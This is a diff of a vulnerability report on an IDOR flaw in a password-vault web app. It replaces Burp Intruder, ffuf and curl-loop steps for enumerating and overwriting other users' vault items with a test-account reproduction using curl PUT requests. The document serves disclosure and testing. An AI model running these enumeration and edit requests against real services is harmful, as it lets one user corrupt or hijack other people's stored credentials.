@@ -35,79 +35,48 @@ Attackers can modify, corrupt, or delete other users' stored credentials. This a
 - **Attacker Account :** testuser1 (authenticated)
 - **Target Account :** testuser2, Any other user's vault items
 
-### Step 1: Identify Target Vault Item IDs
+### Step 1: Create Test Victim Account and Item
 
-Create an item in your own vault first, then use Burp Intruder or ffuf to enumerate all existing item IDs across all user accounts:
-
-**Method 1: Using Burp Intruder**
-1. Create/edit a vault item to capture the PUT request in Burp
-2. Send request to Intruder
-3. Set payload position on the item ID in URL: `/vault/edit/§1§`
-4. Set payload type to Numbers, from 1 to 1000
-5. Add grep extract rule for `"success":true` in response
-6. Start attack - any request returning success indicates a valid item ID
-
-**Method 2: Using ffuf**
+**Create a test account (victim):**
 ```bash
-ffuf -u http://10.0.0.10/vault/edit/FUZZ \
-  -w /path/to/wordlist.txt \
-  -H "Cookie: connect.sid=[your_session]" \
+curl -X POST http://10.0.0.10/register \
   -H "Content-Type: application/json" \
-  -d '{"vaulttitle":"test","vaultusername":"test","vaultpassword":"test"}' \
-  -mc 200 \
-  -fs 0
+  -d '{"username":"victim","password":"victim123"}'
 ```
 
-**Method 3: Sequential Testing with curl**
+**Login as victim and create a vault item:**
 ```bash
-for id in {1..100}; do
-  echo "Testing ID: $id"
-  curl -s -X PUT http://10.0.0.10/vault/edit/$id \
-    -H "Cookie: connect.sid=[session]" \
-    -H "Content-Type: application/json" \
-    -d '{"vaulttitle":"test","vaultusername":"test","vaultpassword":"test"}' | grep -q '"success":true' && echo "Valid ID: $id"
-done
-```
-
-**Expected Results:** Multiple item IDs will return success, indicating they exist and can be modified (IDOR confirmed).
-
-
-### Step 2: Attempt to Edit Own Vault Item (Control)
-
-```bash
-curl -X PUT http://10.0.0.10/vault/edit/15 \
-  -H "Cookie: connect.sid=s%3A7XbzBJgwryh4gzy5ZxHKtW4Fvxt07iwA.OEL0VPB7pHiaSrlqWER3pnzDmlumC0alreNkvB3Xxk8" \
+curl -X POST http://10.0.0.10/login \
   -H "Content-Type: application/json" \
-  -d '{"vaulttitle":"my item","vaultusername":"myuser","vaultpassword":"mypass"}'
+  -d '{"username":"victim","password":"victim123"}'
+# Capture session cookie from response
 ```
 
-**Expected Response:**
-```json
-{"success":true,"message":"Item updated successfully!"}
-```
-
-### Step 3: Edit Another User's Vault Item (IDOR)
-
+**Add item to victim's vault:**
 ```bash
-curl -X PUT http://10.0.0.10/vault/edit/1 \
-  -H "Cookie: connect.sid=s%3A7XbzBJgwryh4gzy5ZxHKtW4Fvxt07iwA.OEL0VPB7pHiaSrlqWER3pnzDmlumC0alreNkvB3Xxk8" \
+curl -X POST http://10.0.0.10/vault/add \
+  -H "Cookie: [victim_session]" \
   -H "Content-Type: application/json" \
-  -d '{"vaulttitle":"updated title from other acc vault","vaultusername":"hacked","vaultpassword":"hacked"}'
+  -d '{"vaulttitle":"Victim Secret","vaultusername":"admin","vaultpassword":"secretpass"}'
 ```
 
-**Vulnerable Response:**
-```json
-{"success":true,"message":"Item updated successfully!"}
+**Note the item ID** from victim's vault page or Burp intercept (typically sequential, e.g., ID 25).
+
+### Step 2: Edit Victim's Item from Attacker Account
+
+**From attacker account, edit the victim's item using the noted ID:**
+```bash
+curl -X PUT http://10.0.0.10/vault/edit/25 \
+  -H "Cookie: [attacker_session]" \
+  -H "Content-Type: application/json" \
+  -d '{"itemId":"25","vaulttitle":"HACKED BY IDOR","vaultusername":"hacked","vaultpassword":"compromised"}'
 ```
 
-**Analysis:** Item ID `1` (belonging to another user) was successfully modified without authorization check.
+**Response:** `{"success":true,"message":"Item updated successfully!"}`
 
-### Step 4: Verify Impact
+### Step 3: Verify Impact
 
-Navigate to vault page and confirm the item was modified. The vault now displays:
-- **Title:** "updated title from other acc vault"
-- **Username:** "hacked"
-- **Password:** "hacked"
+**Login as victim and check vault** - the item shows modified data, confirming IDOR.
 
 ---
 
